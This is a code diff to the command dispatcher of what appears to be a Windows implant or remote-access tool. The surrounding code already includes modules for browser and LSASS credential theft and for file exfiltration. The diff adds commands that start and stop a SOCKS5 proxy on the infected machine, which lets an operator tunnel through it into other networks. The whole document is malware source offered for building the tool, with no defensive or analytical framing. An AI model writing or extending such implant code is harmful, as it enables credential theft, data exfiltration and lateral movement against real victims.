@@ -22,6 +22,7 @@
 #include "../../include/credentials/browser.h"
 #include "../../include/credentials/lsass.h"
 #include "../../include/exfil/exfil.h"
+#include "../../include/network/socks5.h"
 
 /* ============================================================================
  * Parser JSON minimal
@@ -189,6 +190,10 @@ static command_type_t string_to_command(const char *cmd) {
     return CMD_EXFIL_SEARCH;
   if (str_icmp(cmd, "exfil_read") == 0)
     return CMD_EXFIL_READ;
+  if (str_icmp(cmd, "socks5_start") == 0)
+    return CMD_SOCKS5_START;
+  if (str_icmp(cmd, "socks5_stop") == 0)
+    return CMD_SOCKS5_STOP;
 
   return CMD_NONE;
 }
@@ -714,6 +719,40 @@ int dispatcher_execute(task_t *task, task_result_t *result) {
       } else {
         result->output = str_dup("No file path provided");
         status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_SOCKS5_START:
+    {
+      USHORT port = 0; // 0 = choix automatique
+      if (task->args && strlen(task->args) > 0) {
+        port = (USHORT)atoi(task->args);
+      }
+      USHORT actualPort = Socks5_Start(port);
+      if (actualPort > 0) {
+        char msg[64];
+        snprintf(msg, sizeof(msg), "SOCKS5 proxy started on port %u", actualPort);
+        result->output = str_dup(msg);
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("Failed to start SOCKS5 proxy");
+        status = STATUS_FAILURE;
+      }
+      result->output_len = result->output ? strlen(result->output) : 0;
+    }
+    break;
+
+  case CMD_SOCKS5_STOP:
+    {
+      if (Socks5_IsRunning()) {
+        Socks5_Stop();
+        result->output = str_dup("SOCKS5 proxy stopped");
+        status = STATUS_SUCCESS;
+      } else {
+        result->output = str_dup("SOCKS5 proxy not running");
+        status = STATUS_SUCCESS;
       }
       result->output_len = result->output ? strlen(result->output) : 0;
     }
